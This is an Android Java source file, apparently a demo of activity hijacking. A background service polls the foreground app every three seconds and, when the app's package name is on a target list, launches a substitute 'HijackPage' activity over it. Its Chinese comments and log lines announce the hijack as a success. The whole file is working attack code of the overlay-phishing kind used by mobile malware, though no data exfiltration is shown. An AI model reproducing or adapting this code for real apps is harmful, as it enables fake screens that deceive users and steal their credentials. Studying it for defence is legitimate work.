package com.forgotten.activityhijacking;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import java.util.HashMap;
import java.util.Map;

public class HijackingService extends Service {
    private static final String TAG = "hijack";
    private static final int INTERVAL_TIME = 3 * 1000;
    private final Map<String, Class<?>> hijackMap = new HashMap<>();
    private final Handler handler = new Handler();
    private final Runnable mtask = new Runnable() {
        @Override
        public void run() {
            // 获得前台进程的包名
            String currentProcess = ForegroundProcess.getForegroundApp();
            Log.d(TAG, "当前前台应用为：" + currentProcess);

            // 如果前台进程包含在需要劫持的map中
            if (hijackMap.containsKey(currentProcess)) {
                Log.d(TAG, "发现目标应用，开始劫持页面");
                hijacking(currentProcess);
            }
            handler.postDelayed(mtask, INTERVAL_TIME);
        }
    };

    public HijackingService() {
    }

    private void hijacking(String progressName) {

        Intent localIntent = new Intent(HijackingService.this, HijackingService.this.hijackMap.get(progressName));
        localIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        // 启动劫持页面Activity
        startActivity(localIntent);
        Log.w("hijacking", "已经劫持成功");
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        initHijackMap();
        handler.post(mtask);
        super.onCreate();
    }

    private void initHijackMap() {
        // 添加劫持包名 及对应的页面class
        hijackMap.put("android.process.media", HijackPage.class);
    }
}